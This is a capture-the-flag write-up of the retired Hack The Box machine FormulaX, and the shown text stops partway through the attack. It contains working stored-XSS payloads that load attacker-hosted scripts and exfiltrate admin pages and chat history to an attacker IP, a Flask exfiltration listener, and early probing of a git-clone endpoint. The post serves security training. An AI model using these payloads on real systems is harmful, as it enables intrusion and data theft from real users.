<!DOCTYPE html>
<html ⚡>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,minimum-scale=1,initial-scale=1">

    <title>HTB Write-up | FormulaX (user-only)</title>

    <link rel="canonical" href="../index.html" />
    <meta name="referrer" content="no-referrer-when-downgrade" />
    
    <meta property="og:type" content="article" />
    <meta property="og:title" content="HTB Write-up | FormulaX (user-only)" />
    <meta property="og:description" content="Write-up for FormulaX, a retired HTB Linux machine." />
    <meta property="og:url" content="inesmartins.github.io/htb-writeup-formulax/" />
    <meta property="og:image" content="inesmartins.github.io/content/images/2024/08/FormulaX-1.png" />
    <meta property="article:published_time" content="2024-11-13T13:31:33.000Z" />
    <meta property="article:modified_time" content="2024-11-13T13:32:19.000Z" />
    <meta property="article:tag" content="ctf" />
    <meta property="article:tag" content="htb" />
    
    <meta name="twitter:card" content="summary_large_image" />
    <meta name="twitter:title" content="HTB Write-up | FormulaX (user-only)" />
    <meta name="twitter:description" content="Write-up for FormulaX, a retired HTB Linux machine." />
    <meta name="twitter:url" content="inesmartins.github.io/htb-writeup-formulax/" />
    <meta name="twitter:image" content="inesmartins.github.io/content/images/2024/08/FormulaX-1.png" />
    <meta name="twitter:label1" content="Written by" />
    <meta name="twitter:data1" content="Inês Martins" />
    <meta name="twitter:label2" content="Filed under" />
    <meta name="twitter:data2" content="ctf, htb" />
    <meta property="og:image:width" content="1400" />
    <meta property="og:image:height" content="1138" />
    
    <script type="application/ld+json">
{
    "@context": "https://schema.org",
    "@type": "Article",
    "publisher": {
        "@type": "Organization",
        "name": "",
        "url": "inesmartins.github.io/",
        "logo": {
            "@type": "ImageObject",
            "url": "inesmartins.github.io/favicon.ico",
            "width": 48,
            "height": 48
        }
    },
    "author": {
        "@type": "Person",
        "name": "Inês Martins",
        "image": {
            "@type": "ImageObject",
            "url": "inesmartins.github.io/content/images/2022/08/1658857349956.jpeg",
            "width": 420,
            "height": 420
        },
        "url": "inesmartins.github.io/author/ines/",
        "sameAs": [
            "https://www.linkedin.com/in/ines-af-martins/"
        ]
    },
    "headline": "HTB Write-up | FormulaX (user-only)",
    "url": "inesmartins.github.io/htb-writeup-formulax/",
    "datePublished": "2024-11-13T13:31:33.000Z",
    "dateModified": "2024-11-13T13:32:19.000Z",
    "image": {
        "@type": "ImageObject",
        "url": "inesmartins.github.io/content/images/2024/08/FormulaX-1.png",
        "width": 1400,
        "height": 1138
    },
    "keywords": "ctf, htb",
    "description": "Write-up for FormulaX, a retired HTB Linux machine.",
    "mainEntityOfPage": {
        "@type": "WebPage",
        "@id": "inesmartins.github.io/"
    }
}
    </script>

    <meta name="generator" content="Ghost 4.7" />
    <link rel="alternate" type="application/rss+xml" title="" href="../../rss/index.html" />

    <style amp-custom>
    *,
    *::before,
    *::after {
        box-sizing: border-box;
    }

    html {
        overflow-x: hidden;
        overflow-y: scroll;
        font-size: 62.5%;
        -webkit-tap-highlight-color: rgba(0, 0, 0, 0);
    }

    body {
        min-height: 100vh;
        margin: 0;
        padding: 0;
        color: #3a4145;
        font-family: -apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen,Ubuntu,Cantarell,Open Sans,Helvetica Neue,sans-serif;
        font-size: 1.7rem;
        line-height: 1.55em;
        font-weight: 400;
        font-style: normal;
        background: #fff;
        scroll-behavior: smooth;
        overflow-x: hidden;
        -webkit-font-smoothing: antialiased;
        -moz-osx-font-smoothing: grayscale;
    }

    p,
    ul,
    ol,
    li,
    dl,
    dd,
    hr,
    pre,
    form,
    table,
    video,
    figure,
    figcaption,
    blockquote {
        margin: 0;
        padding: 0;
    }

    ul[class],
    ol[class] {
        padding: 0;
        list-style: none;
    }

    img {
        display: block;
        max-width: 100%;
    }

    input,
    button,
    select,
    textarea {
        font: inherit;
        -webkit-appearance: none;
    }

    fieldset {
        margin: 0;
        padding: 0;
        border: 0;
    }

    label {
        display: block;
        font-size: 0.9em;
        font-weight: 700;
    }

    hr {
        position: relative;
        display: block;
        width: 100%;
        height: 1px;
        border: 0;
        border-top: 1px solid currentcolor;
        opacity: 0.1;
    }

    ::selection {
        text-shadow: none;
        background: #cbeafb;
    }

    mark {
        background-color: #fdffb6;
    }

    small {
        font-size: 80%;
    }

    sub,
    sup {
        position: relative;
        font-size: 75%;
        line-height: 0;
        vertical-align: baseline;
    }
    sup {
        top: -0.5em;
    }
    sub {
        bottom: -0.25em;
    }

    ul li + li {
        margin-top: 0.6em;
    }

    a {
        color: var(--ghost-accent-color, #1292EE);
        text-decoration-skip-ink: auto;
    }

    h1,
    h2,
    h3,
    h4,
    h5,
    h6 {
        margin: 0;
        font-weight: 700;
        color: #121212;
        line-height: 1.4em;
    }

    h1 {
        font-size: 3.4rem;
        line-height: 1.1em;
    }

    h2 {
        font-size: 2.4rem;
        line-height: 1.2em;
    }

    h3 {
        font-size: 1.8rem;
    }

    h4 {
        font-size: 1.7rem;
    }

    h5 {
        font-size: 1.6rem;
    }

    h6 {
        font-size: 1.6rem;
    }

    amp-img {
        height: 100%;
        width: 100%;
        max-width: 100%;
        max-height: 100%;
    }

    amp-img img {
        object-fit: cover;
    }

    .page-header {
        padding: 50px 5vmin 30px;
        text-align: center;
        font-size: 2rem;
        text-transform: uppercase;
        letter-spacing: 0.5px;
    }

    .page-header a {
        color: #121212;
        font-weight: 700;
        text-decoration: none;
        font-size: 1.6rem;
        letter-spacing: -0.1px;
    }

    .post {
        max-width: 680px;
        margin: 0 auto;
    }

    .post-header {
        margin: 0 5vmin 5vmin;
        text-align: center;
    }

    .post-meta {
        margin: 1rem 0 0 0;
        text-transform: uppercase;
        color: #738a94;
        font-weight: 500;
        font-size: 1.3rem;
    }

    .post-image {
        margin: 0 0 5vmin;
    }

    .post-image img {
        display: block;
        width: 100%;
        height: auto;
    }

    .post-content {
        padding: 0 5vmin;
    }

    .post-content > * + * {
        margin-top: 1.5em;
    }

    .post-content [id]:not(:first-child) {
        margin: 2em 0 0;
    }

    .post-content > [id] + * {
        margin-top: 1rem;
    }

    .post-content [id] + .kg-card,
    .post-content blockquote + .kg-card {
        margin-top: 40px;
    }

    .post-content > ul,
    .post-content > ol,
    .post-content > dl {
        padding-left: 1.9em;
    }

    .post-content hr {
        margin-top: 40px;
    }

    .post .post-content hr + * {
        margin-top: 40px;
    }

    .post-content amp-img {
        background-color: #f8f8f8;
    }

    .post-content blockquote {
        position: relative;
        font-style: italic;
    }

    .post-content blockquote::before {
        content: "";
        position: absolute;
        left: -1.5em;
        top: 0;
        bottom: 0;
        width: 0.3rem;
        background: var(--ghost-accent-color, #1292EE);
    }

    .post-content :not(.kg-card):not([id]) + .kg-card {
        margin-top: 40px;
    }

    .post-content .kg-card + :not(.kg-card) {
        margin-top: 40px;
    }

    .kg-card figcaption {
        padding: 1.5rem 1.5rem 0;
        text-align: center;
        font-weight: 500;
        font-size: 1.3rem;
        line-height: 1.4em;
        opacity: 0.6;
    }

    .kg-card figcaption strong {
        color: rgba(0,0,0,0.8);
    }

    .post-content :not(pre) code {
        vertical-align: middle;
        padding: 0.15em 0.4em 0.15em;
        border: #e1eaef 1px solid;
        font-weight: 400;
        font-size: 0.9em;
        line-height: 1em;
        color: #15171a;
        background: #f0f6f9;
        border-radius: 0.25em;
    }

    .post-content > pre {
        overflow: scroll;
        padding: 16px 20px;
        color: #fff;
        background: #1F2428;
        border-radius: 5px;
        box-shadow: 0 2px 6px -2px rgba(0,0,0,.1), 0 0 1px rgba(0,0,0,.4);
    }

    .kg-embed-card {
        display: flex;
        flex-direction: column;
        align-items: center;
        width: 100%;
    }

    .kg-image-card img {
        margin: auto;
    }

    .kg-gallery-card + .kg-gallery-card {
        margin-top: 0.75em;
    }

    .kg-gallery-container {
        position: relative;
    }

    .kg-gallery-row {
        display: flex;
        flex-direction: row;
        justify-content: center;
    }

    .kg-gallery-image {
        width: 100%;
        height: 100%;
    }

    .kg-gallery-row:not(:first-of-type) {
        margin: 0.75em 0 0 0;
    }

    .kg-gallery-image:not(:first-of-type) {
        margin: 0 0 0 0.75em;
    }

    .kg-bookmark-card,
    .kg-bookmark-publisher {
        position: relative;
    }

    .kg-bookmark-container,
    .kg-bookmark-container:hover {
        display: flex;
        flex-wrap: wrap;
        flex-direction: row-reverse;
        color: currentColor;
        background: rgba(255,255,255,0.6);
        font-family: -apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen,Ubuntu,Cantarell,Open Sans,Helvetica Neue,sans-serif;
        text-decoration: none;
        border-radius: 5px;
        box-shadow: 0 2px 6px -2px rgba(0, 0, 0, 0.1), 0 0 1px rgba(0, 0, 0, 0.4);
        overflow: hidden;
    }

    .kg-bookmark-content {
        flex-basis: 0;
        flex-grow: 999;
        padding: 20px;
        order: 1;
    }

    .kg-bookmark-title {
        font-weight: 600;
        font-size: 1.5rem;
        line-height: 1.3em;
    }

    .kg-bookmark-description {
        display: -webkit-box;
        max-height: 45px;
        margin: 0.5em 0 0 0;
        font-size: 1.4rem;
        line-height: 1.55em;
        overflow: hidden;
        opacity: 0.8;
        -webkit-line-clamp: 2;
        -webkit-box-orient: vertical;
    }

    .kg-bookmark-metadata {
        margin-top: 20px;
    }

    .kg-bookmark-metadata {
        display: flex;
        align-items: center;
        font-weight: 500;
        font-size: 1.3rem;
        line-height: 1.3em;
        white-space: nowrap;
        overflow: hidden;
        text-overflow: ellipsis;
    }

    .kg-bookmark-description {
        display: -webkit-box;
        -webkit-box-orient: vertical;
        -webkit-line-clamp: 2;
        overflow: hidden;
    }

    .kg-bookmark-metadata amp-img {
        width: 18px;
        height: 18px;
        max-width: 18px;
        max-height: 18px;
        margin-right: 10px;
    }

    .kg-bookmark-thumbnail {
        display: flex;
        flex-basis: 20rem;
        flex-grow: 1;
        justify-content: flex-end;
    }

    .kg-bookmark-thumbnail amp-img {
        max-height: 200px;
    }

    .kg-bookmark-author {
        white-space: nowrap;
        text-overflow: ellipsis;
        overflow: hidden;
    }

    .kg-bookmark-publisher::before {
        content: "•";
        margin: 0 .5em;
    }

    .kg-width-full.kg-card-hascaption {
        display: grid;
        grid-template-columns: inherit;
    }

    .post-content table {
        border-collapse: collapse;
        width: 100%;
    }

    .post-content th {
        padding: 0.5em 0.8em;
        text-align: left;
        font-size: .75em;
        text-transform: uppercase;
    }

    .post-content td {
        padding: 0.4em 0.7em;
    }

    .post-content tbody tr:nth-child(2n + 1) {
        background-color: rgba(0,0,0,0.1);
        padding: 1px;
    }

    .post-content tbody tr:nth-child(2n + 2) td:last-child {
        box-shadow:
            inset 1px 0 rgba(0,0,0,0.1),
            inset -1px 0 rgba(0,0,0,0.1);
    }

    .post-content tbody tr:nth-child(2n + 2) td {
        box-shadow: inset 1px 0 rgba(0,0,0,0.1);
    }

    .post-content tbody tr:last-child {
        border-bottom: 1px solid rgba(0,0,0,.1);
    }

    .page-footer {
        padding: 60px 5vmin;
        margin: 60px auto 0;
        text-align: center;
        background-color: #f8f8f8;
    }

    .page-footer h3 {
        margin: 0.5rem 0 0 0;
    }

    .page-footer p {
        max-width: 500px;
        margin: 1rem auto 1.5rem;
        font-size: 1.7rem;
        line-height: 1.5em;
        color: rgba(0,0,0,0.6)
    }

    .powered {
        display: inline-flex;
        align-items: center;
        margin: 30px 0 0;
        padding: 6px 9px 6px 6px;
        border: rgba(0,0,0,0.1) 1px solid;
        font-size: 12px;
        line-height: 12px;
        letter-spacing: -0.2px;
        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", "Roboto", "Oxygen", "Ubuntu", "Cantarell", "Fira Sans", "Droid Sans", "Helvetica Neue", sans-serif;
        font-weight: 500;
        color: #222;
        text-decoration: none;
        background: #fff;
        border-radius: 6px;
    }

    .powered svg {
        height: 16px;
        width: 16px;
        margin: 0 6px 0 0;
    }

    @media (max-width: 600px) {
        body {
            font-size: 1.6rem;
        }
        h1 {
            font-size: 3rem;
        }

        h2 {
            font-size: 2.2rem;
        }
    }

    @media (max-width: 400px) {
        h1 {
            font-size: 2.6rem;
            line-height: 1.15em;
        }
        h2 {
            font-size: 2rem;
            line-height: 1.2em;
        }
        h3 {
            font-size: 1.7rem;
        }
    }

    :root {--ghost-accent-color: #000000;}
    </style>

    <style amp-boilerplate>body{-webkit-animation:-amp-start 8s steps(1,end) 0s 1 normal both;-moz-animation:-amp-start 8s steps(1,end) 0s 1 normal both;-ms-animation:-amp-start 8s steps(1,end) 0s 1 normal both;animation:-amp-start 8s steps(1,end) 0s 1 normal both}@-webkit-keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}@-moz-keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}@-ms-keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}@-o-keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}@keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}</style><noscript><style amp-boilerplate>body{-webkit-animation:none;-moz-animation:none;-ms-animation:none;animation:none}</style></noscript>
    <script async src="https://cdn.ampproject.org/v0.js"></script>

    

</head>

<body class="amp-template">
    <header class="page-header">
        <a href="../../index.html">
                
        </a>
    </header>

    <main class="content" role="main">
        <article class="post">

            <header class="post-header">
                <h1 class="post-title">HTB Write-up | FormulaX (user-only)</h1>
                <section class="post-meta">
                    Inês Martins -
                    <time class="post-date" datetime="2024-11-13">13 Nov 2024</time>
                </section>
            </header>
            <figure class="post-image">
                <amp-img src="inesmartins.github.io/content/images/2024/08/FormulaX-1.png" width="600" height="340" layout="responsive"></amp-img>
            </figure>
            <section class="post-content">

                <p><em>Retired machine can be found <a href="https://www.hackthebox.com/machines/FormulaX">here</a>.</em></p><hr></hr><p>Let's start with some basic enumeration:</p><pre><code class="language-bash">~ nmap -F 10.10.11.6

PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
</code></pre><p>There's a web application running on port <code>80</code>:</p><figure class="kg-card kg-image-card kg-width-wide kg-card-hascaption"><figcaption>http://10.10.11.6/static/index.html</figcaption></figure><p>The source code discloses a couple authenticated routes, which may be useful in the future:</p><figure class="kg-card kg-code-card"><pre><code class="language-html">if (response.data.Status == "success") {
	//redirect to the home page
	localStorage.setItem("logged_in", "true");
	window.location.href = `/restricted/home.html`;
} else if (response.data.Status == "admin") {
	localStorage.setItem("logged_in", "admin");
	window.location.href = `/admin/admin.html`;
}
</code></pre><figcaption>http://10.10.11.6/static/index.html</figcaption></figure><p>We can register a new account:</p><figure class="kg-card kg-image-card kg-card-hascaption"><figcaption>http://10.10.11.6/static/register.html</figcaption></figure><figure class="kg-card kg-image-card kg-card-hascaption"><figcaption>http://10.10.11.6/restricted/home.html</figcaption></figure><h2 id="interacting-with-the-chatbot">Interacting with the Chatbot</h2><figure class="kg-card kg-image-card kg-width-wide kg-card-hascaption"><figcaption>http://10.10.11.6/restricted/chat.html</figcaption></figure><p>The chatbot is very limited. According to the output of the <code>help</code> command we should only be able to execute the <code>history</code> command and "ask random questions":</p><figure class="kg-card kg-image-card kg-card-hascaption"><figcaption>http://10.10.11.6/restricted/chat.html</figcaption></figure><p>It looks like the <code>history</code> command only displays the commands previously sent by our user: </p><figure class="kg-card kg-image-card kg-card-hascaption"><figcaption>http://10.10.11.6/restricted/chat.html</figcaption></figure><p>Under the hood, here is how this chatbot seems to work:</p><h3 id="step-1html-page-and-resources-are-loaded">Step 1 - HTML page and resources are loaded</h3><p>The <code>/restricted/chat.html</code> page loads the following scripts:</p><pre><code class="language-html">&lt;script src="/scripts/axios.min.js"&gt;&lt;/script&gt;
&lt;script src="/socket.io/socket.io.js"&gt;&lt;/script&gt;
&lt;script src="./chat.js"&gt;&lt;/script&gt;</code></pre><p>Both the <a href="https://axios-http.com/docs/intro">Axios</a> and the <a href="https://socket.io/">Socket.IO</a> scripts are common libraries: the first is used to manage http requests while the second helps with socket connections.</p><p>The <code>chat.js</code> script contains the "custom" logic for this page.</p><h3 id="step-2api-endpoint-is-requested">Step 2 - API endpoint is requested</h3><p>As shown below, <code>chat.js</code> starts by sending a GET request to <code>/user/api/chat</code>:</p><pre><code>let value;
const res = axios.get(`/user/api/chat`);
...</code></pre><p>This request simply returns a <code>200</code> and the text <code>Chat Room</code>, so at this point I'm not exactly sure how it's being used:</p><pre><code>GET /user/api/chat HTTP/1.1
Host: 10.10.11.6
...
Cookie: authorization=Bearer%20eyJ...</code></pre><pre><code>HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Thu, 01 Aug 2024 10:46:16 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 9
Connection: keep-alive
X-Powered-By: Express
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
ETag: W/"9-p4gNjrNhAjU5JKDfjagWi07JjzQ"

Chat Room</code></pre><h3 id="step-3socket-connection-is-established">Step 3 - Socket connection is established</h3><p>Next, <code>chat.js</code> establishes the socket connection using <a href="https://socket.io/docs/v4/client-api/#iourl">the <code>io</code> function</a>: </p><pre><code class="language-js">let value;
const socket = io('/',{withCredentials: true});</code></pre><p>The <a href="https://socket.io/docs/v4/client-options/#withcredentials"><code>withCredentials</code> option</a> works as follows:</p><blockquote>Whether the cross-site requests should be sent including credentials such as cookies, authorization headers or TLS client certificates. Setting <code>withCredentials</code> has no effect on same-site requests.</blockquote><h3 id="step-4incoming-messages-are-displayed-on-the-page">Step 4 - Incoming messages are displayed on the page</h3><p>Next, the <code>chat.js</code> script makes sure to display any incoming messages from the server, by setting the <code>innerHTML</code> value of a new <code>div</code> element, <u>which is prone to XSS when there is no sanitisation</u>:</p><pre><code class="language-javascript">//listening for the messages
socket.on('message', (my_message) =&gt; {
  //console.log("Received From Server: " + my_message)
  Show_messages_on_screen_of_Server(my_message)
})

// [...]

const Show_messages_on_screen_of_Server = (value) =&gt; {
  const div = document.createElement('div');
  div.classList.add('container')
  div.innerHTML = `  
  &lt;h2&gt;&amp;#129302;  &lt;/h2&gt;
    &lt;p&gt;${value}&lt;/p&gt;
  `
  document.getElementById('big_container').appendChild(div)
}</code></pre><h3 id="step-5messages-typed-by-the-user-are-sent-to-the-server-and-sanitised">Step 5 - Messages typed by the user are sent to the server and sanitised</h3><p>The messages typed by the user are sent to the server and then, to prevent XSS, they're sanitised with the custom <code>htmlEncode</code> function before being displayed on the screen (also by setting the <code>innerHTML</code> property of a new <code>div</code> element):</p><pre><code class="language-javascript">const typing_chat = () =&gt; {
  value = document.getElementById('user_message').value
  if (value) {
    // sending the  messages to the server
    socket.emit('client_message', value)
    Show_messages_on_screen_of_Client(value);
    // here we will do out socket things..
    document.getElementById('user_message').value = ""
  }
  else {
    alert("Cannot send Empty Messages");
  }
}

function htmlEncode(str) {
  return String(str).replace(/[^\w. ]/gi, function (c) {
    return '&amp;#' + c.charCodeAt(0) + ';';
  });
}

// send the input to the chat forum
const Show_messages_on_screen_of_Client = (value) =&gt; {
  value = htmlEncode(value)
  const div = document.createElement('div');
  div.classList.add('container')
  div.classList.add('darker')
  div.innerHTML = `  
  &lt;h2&gt;&amp;#129302;  &lt;/h2&gt;
      &lt;p&gt;${value}&lt;/p&gt;
  `
  document.getElementById('big_container').appendChild(div)
}</code></pre><p><u>Custom sanitisation functions are notably prone to error and bypasses, so this is also a good place to start</u>.</p><h2 id="trying-to-achieve-xss-on-the-chatbot">Trying to achieve XSS on the Chatbot</h2><p>This was a bit of a red-herring. </p><p>Since we have access to the <code>history</code> command, I thought the obvious way to go was to send some sort of payload that would be encoded server-side in a way that could be abused to achieve XSS (since server messages are directly embedded in the DOM) but this was not easily achieved.</p><p>Also, bypassing the client-side encoding (aka the <code>htmlEncode</code> function) proved to be more tricky than expected.</p><p>So, I needed to change my approach.</p><h2 id="exploring-the-contact-form">Exploring the Contact Form</h2><figure class="kg-card kg-image-card kg-width-wide kg-card-hascaption"><figcaption>http://10.10.11.6/restricted/contact_us.html</figcaption></figure><p>The contact form has 3 fields which seem to be vulnerable to some sort of persistent <code>XSS</code> which is being triggered by some other user, since the elements are being correctly sanitized before being loaded into our Contact Form page:</p><pre><code>POST /user/api/contact_us HTTP/1.1
Host: 10.10.11.6
...
Cookie: authorization=Bearer%20eyJ...

{
    "first_name":"&lt;img src='http://10.10.14.69?src=img'&gt;",
    "last_name":"&lt;script src='http://10.10.14.69?src=script'&gt;&lt;/script&gt;",
    "message":"&lt;iframe src='http://10.10.14.69?src=iframe'&gt;&lt;/iframe&gt;"
}</code></pre><p>Since only the <code>img</code> and <code>iframe</code> elements trigger the callback, we can also assume that <code>script</code> tags are being filtered somehow:</p><pre><code class="language-bash">~ python3 -m http.server 80
Serving HTTP on :: port 80 (http://[::]:80/) ...
::ffff:10.10.11.6 - - [01/Aug/2024 12:19:08] "GET /?src=iframe HTTP/1.1" 200 -
::ffff:10.10.11.6 - - [01/Aug/2024 12:19:08] "GET /?src=img HTTP/1.1" 200 -</code></pre><p>After some tweaking we get the following working XSS payload:</p><pre><code class="language-html">POST /sendMessage HTTP/1.1
Host: capiclean.htb
User-Agent: python-requests/2.32.3
Accept-Encoding: gzip, deflate, br
Accept: */*
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 217

service=%3Cimg%20src%3Dx%20onerror%3D%22var%20script1%3Ddocument.createElement%28%27script%27%29%3Bscript1.src%3D%27http%3A//10.10.14.69%3A80/exfil_current_page.js%27%3Bdocument.head.appendChild%28script1%29%3B%22/%3E</code></pre><h2 id="using-the-stored-xss-to-exfiltrate-the-chat-messages">Using the Stored XSS to exfiltrate the Chat Messages</h2><p>Usually with XSS we try to exfiltrate authorisation tokens, but we know that the <code>authorization</code> cookie is defined with the <code>HttpOnly</code> directive set to <code>true</code>, which means it's not accessible by JavaScript.</p><p>So, let's start by understanding where this XSS vulnerability is actually being triggered by requesting the current page:</p><pre><code class="language-javascript">(function () {
    const attackers_ip = '10.10.14.69';
    const flask_api_port = '9000';
    var exfil_data = function(data) {
        encoded_data = encodeURIComponent(data);
        fetch(
            `http://${attackers_ip}:${flask_api_port}/api/exfil?encoding=base64`,
            {
                method: 'POST',
                headers: { "Content-Type": "application/x-www-form-urlencoded" },
                body: "data=" + encoded_data
            }
        );
    }
    var attack = function() {
        try {
            fetch(window.location.href, { credentials: "include" })
            .then(response =&gt; response.text())
            .then(data =&gt; {
                exfil_data(btoa(window.location.href))
                exfil_data(btoa(data))
                var el = document.createElement('html');
                el.innerHTML = data
                all_scripts = el.getElementsByTagName('script');
                for (var i = 0; i &lt; all_scripts.length; i++) {
                    exfil_data(btoa(all_scripts[i].src))
                    fetch(all_scripts[i].src, { credentials: "include" })
                    .then(response =&gt; response.text())
                    .then(page_content =&gt; exfil_data(btoa(page_content)));
                }
            })
            .catch(error =&gt; fetch(`http://${attackers_ip}?debug=${error.message}`))
        } catch(error) {
            fetch(`http://${attackers_ip}?debug=${error.message}`)
        }
    }
    attack();
}());
</code></pre><p>As you can see above, the page content is being exfiltrated to a local endpoint, which is being handled by a simple Flask API:</p><pre><code class="language-python">import json
from flask import Flask, request
from flask_cors import CORS
from urllib.parse import unquote
import base64

app = Flask(__name__)
CORS(app)

@app.route('/api/exfil', methods=['POST'])
def exfil():
    print("[+] Received data ")
    encoding = request.args.get('encoding')
    data = request.form.get('data')
    try:
        decoded_data = unquote(unquote(data))
        if encoding is not None and encoding == 'base64':
            print(base64.b64decode(decoded_data))
        else:
            print(decoded_data)
    except Exception as exception:
        print(f'Something went wrong: {exception}')
        return json.dumps({'success':False}), 500, {'ContentType':'application/json'}
    return json.dumps({'success':True}), 200, {'ContentType':'application/json'}

app.run(host='0.0.0.0', port=9000)
</code></pre><p>It looks like the current page is <a href="http://chatbot.htb/admin/admin.html">http://chatbot.htb/admin/admin.html</a>:</p><figure class="kg-card kg-image-card kg-card-hascaption"><figcaption>admin.html</figcaption></figure><figure class="kg-card kg-code-card"><pre><code class="language-javascript">const get_messages = () =&gt; {
    const value = document.getElementById("search").value
    axios.get(`/user/api/get_messages`).then((response) =&gt; {
        try {
            response.data.Message.forEach((message =&gt; {
                console.log(message.firstname)
                const div = document.createElement("div");
                div.classList.add("new_container")
                div.innerHTML = `
&lt;div&gt;&lt;label style="color: red;" id="firstname"&gt;${message.firstname} &lt;/label&gt;&lt;/div&gt;
&lt;div&gt;&lt;label style="color: red;" id="lastname"&gt; ${message.lastname}&lt;/label&gt;&lt;/div&gt;
&lt;div&gt;&lt;label style="color: red;" id="message"&gt; ${message.message}&lt;/label&gt;&lt;/div&gt;
                `
              document.getElementById("big_container").appendChild(div)
            }))
        } catch (err) {
            document.getElementById("error").innerHTML = response.data.Status
        }
    }
}</code></pre><figcaption>admin.js</figcaption></figure><p>It seems like the <code>/user/api/get_messages</code> request is responsible for fetching all of the messages submitted via the contact form and embedding them directly into the DOM, which is why we have the XSS.</p><p>Let's see if there are any other interesting messages:</p><pre><code class="language-javascript">(function () {
    const attackers_ip = '10.10.14.69';
    const flask_api_port = '9000';
    var exfil_data = function(data) {
        // ...
    }
    var attack = function() {
        try {
            fetch(`/user/api/get_messages`, { credentials: "include" })
            .then(response =&gt; response.text())
            .then(data =&gt; exfil_data(btoa(data)))
            .catch(error =&gt; fetch(`http://${attackers_ip}?debug=${error.message}`))
        } catch(error) {
            fetch(`http://${attackers_ip}?debug=${error.message}`)
        }
    }
    attack();
}());
</code></pre><p>Only our previous message shows up.</p><p>Let's see if this user has any interesting chat messages in their history by importing the <a href="inesmartins.github.io/htb-writeup-formulax/amp/Socket.IO">Socket.io</a> script to this Admin page, establishing a new socket connection, sending the <code>history</code> command, and then exfiltrating any messages to our Flask API:</p><pre><code class="language-javascript">(function () {
	// [...]
    var attack = function() {
        const script = document.createElement('script');
        script.src = '/socket.io/socket.io.js';
        document.head.appendChild(script);
        script.addEventListener('load', function() {
            const res = axios.get(`/user/api/chat`);
            const socket = io('/', { withCredentials: true });
            socket.on('message', (my_message) =&gt; exfil_data(btoa(my_message)));
            socket.emit('client_message', 'history');
        });
    }
    attack();
}());
</code></pre><p>The result is the following:</p><pre><code class="language-html">Greetings!. How can i help you today ?. You can type help to see some buildin commands

Hello, I am Admin.Testing the Chat Application

Write a script for  dev-git-auto-update.chatbot.htb to work properly

Write a script to automate the auto-update

Message Sent:&lt;br&gt;history</code></pre><p>Let’s map out the new domains:</p><pre><code class="language-html">sudo nano /etc/hosts

# htb
10.10.11.6 chatbot.htb
10.10.11.6 dev-git-auto-update.chatbot.htb
</code></pre><h2 id="exploring-the-git-auto-report-generator">Exploring the Git Auto Report Generator</h2><figure class="kg-card kg-image-card kg-width-wide kg-card-hascaption"><figcaption>http://dev-git-auto-update.chatbot.htb/</figcaption></figure><p>We can see that this feature was built using <code>simple-git v3.14</code>.</p><p>The <a href="https://www.npmjs.com/package/simple-git">simple-git</a> NPM package is "a lightweight interface for running <code>git</code> commands in any <a href="https://nodejs.org/" rel="nofollow">node.js</a> application."</p><p>We can see in the source code of the <code>index.js</code> script that any value we enter in the input box is sent via POST request to the <code>clone</code> endpoint and the response is again embedded into the DOM directly, without sanitization.</p><pre><code>const handleRequest = () =&gt; {
    document.getElementById('error').innerHTML = "Loading...";
    // Get the element
    const value = document.getElementById('giturl').value
    console.log(value)
    // Send the post request
    fetch('/clone', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            destinationUrl: value
        })
    })
        .then(response =&gt; { return response.json() }).then(response =&gt; {
            if (response.response != 'Error: Failed to Clone')
                document.getElementById('error').innerHTML = `&lt;a href="${(response.response)}" download&gt;Download File&lt;/a&gt;`
            else
                document.getElementById('error').innerHTML = response.response

        })
        .catch(err =&gt; {
            document.getElementById('error').innerHTML = err
        })
        
}</code></pre><p>However, we're not interested in XSS at this point, we want to be able to execute commands directly on the machine, so we need to focus on exploiting this endpoint:</p><pre><code>POST /clone HTTP/1.1
Host: dev-git-auto-update.chatbot.htb
Content-Type: application/json

{"destinationUrl":"http://10.10.14.69:9000"}</code></pre><pre><code>~ python3 -m http.server 9000

Serving HTTP on :: port 9000 (http://[::]:9000/) ...
::ffff:10.10.11.6 - - [01/Aug/2024 14:29:48] code 404, message File not found
::ffff:10.10.11.6 - - [01/Aug/2024 14:29:48] "GET /info/refs?service=git-upload-pack HTTP/1.1" 404 -</code></pre><p>Going through the documentation, it seems like this request is the result of a <code>git fetch</code> or a <code>git fetch-pack</code> being performed by a Git client.</p><p>Basically, it's a way for the client to ask a Git server "to send objects missing from this repository, to update the named heads". In response, the server sends "a UNIX formatted text file describing each ref and its known value".<br />[<a href="https://mincong.io/2018/05/04/git-and-http/">Source</a>]</p><p>However, when we try to respond with the format specified in the documentation, we still get an error:</p><pre><code class="language-python">import json
from flask import Flask
from flask_cors import CORS

app = Flask(__name__)
CORS(app)

@app.route('/info/refs', methods=['GET'])
def handle_git_request():
    headers = {
        'ContentType':'application/x-git-upload-pack-advertisement',
        'Cache-Control': 'no-cache'
    }
    response = '001e# service=git-upload-pack\n'
    response += '004895dcfa3633004da0049d3d0fa03f80589cbcaf31 refs/heads/maint\0multi_ack\n'
    response += '0042d049f6c27a2244e12041955e262a404c7faba355 refs/heads/master\n'
    response += '003c2cb58b79488a98d2721cea644875a8dd0026b115 refs/tags/v1.0\n'
    response += '003fa3c2e2402b99163d1d59756e5f207ae21cccba4c refs/tags/v1.0^{}\n'
    return response, 200, headers

app.run(host='0.0.0.0', port=9000)
